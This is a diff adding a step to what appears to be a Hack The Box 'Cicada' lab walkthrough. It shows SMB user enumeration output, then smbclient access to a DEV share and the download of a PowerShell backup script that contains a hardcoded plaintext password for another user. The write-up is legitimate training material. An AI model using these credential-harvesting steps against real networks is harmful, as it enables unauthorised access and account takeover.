@@ -336,3 +336,35 @@ SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious 
 SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
 SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
 ```
+
+```
+┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada]
+└─$ smbclient //10.10.11.35/DEV -U david.orelious                                                 
+Password for [WORKGROUP\david.orelious]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Mar 14 13:31:39 2024
+  ..                                  D        0  Thu Mar 14 13:21:29 2024
+  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024
+
+                4168447 blocks of size 4096. 377922 blocks available
+smb: \> mget Backup_script.ps1 
+Get file Backup_script.ps1? y
+getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (5,5 KiloBytes/sec) (average 5,5 KiloBytes/sec)
+smb: \> ^C
+                                                                                                                                                                                                
+┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada]
+└─$ cat Backup_script.ps1   
+
+$sourceDirectory = "C:\smb"
+$destinationDirectory = "D:\Backup"
+
+$username = "emily.oscars"
+$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
+$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$backupFileName = "smb_backup_$dateStamp.zip"
+$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
+```
